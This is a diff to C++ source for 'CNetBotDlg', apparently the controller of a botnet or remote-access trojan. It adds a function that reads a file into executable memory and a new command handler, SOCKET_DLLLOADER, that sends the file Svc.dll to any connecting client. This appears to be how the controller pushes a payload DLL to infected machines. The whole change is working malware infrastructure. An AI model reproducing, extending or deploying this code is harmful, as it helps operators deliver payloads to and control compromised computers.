@@ -665,6 +665,51 @@ void CNetBotDlg::ListenError(int ErrorCode)
 	StatusTextOut(1, strOutText);
 }
 
+int __stdcall ReadData(TCHAR szFile[],char **data)
+{
+	char szPath[256];
+	GetModuleFileName(GetModuleHandle(NULL), szPath, 256);
+	
+	for(int i = lstrlen(szPath); i > 0; i--)
+	{
+		if(szPath[i] == '\\')
+		{
+			szPath[i] = '\0';
+			break;
+		}
+	}
+	
+	SetCurrentDirectory(szPath);
+
+	HANDLE hFile;
+	TCHAR szLogFileName[256];
+	wsprintf(szLogFileName, _T("%s\\%s"), szPath, szFile);
+	
+	hFile = CreateFile(szLogFileName,
+		GENERIC_ALL,
+		FILE_SHARE_READ,
+		(LPSECURITY_ATTRIBUTES) NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		(HANDLE) NULL);
+	
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		DWORD dwSize = GetFileSize(hFile,NULL);
+		
+		*data = (CHAR *)VirtualAlloc(NULL,dwSize,MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		
+		ReadFile(hFile,*data,dwSize,&dwSize,NULL);
+		
+		CloseHandle(hFile);
+		
+		return dwSize;
+	}
+	
+	MsgErr(_T("Read %s Error"),szLogFileName);
+	
+	return 0;
+}
 
 DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 {
@@ -684,6 +729,21 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 		//解析命令
 		switch(msgHead.dwCmd)
 		{
+		case SOCKET_DLLLOADER:
+			{
+				PCHAR SvcFileBuf;
+				int SvcFileSize = ReadData(_T("Svc.dll"), &SvcFileBuf);
+
+				MsgHead msgHead;
+				msgHead.dwCmd = CMD_DLLDATA;
+				msgHead.dwSize = SvcFileSize;
+					
+				SendMsg(socket, SvcFileBuf, &msgHead);
+
+				VirtualFree(SvcFileBuf, SvcFileSize, MEM_RELEASE);
+			}
+			break;
+
 		case SOCKET_CONNECT://连接控制的socket
 			{
 				SysInfo m_SysInfo;
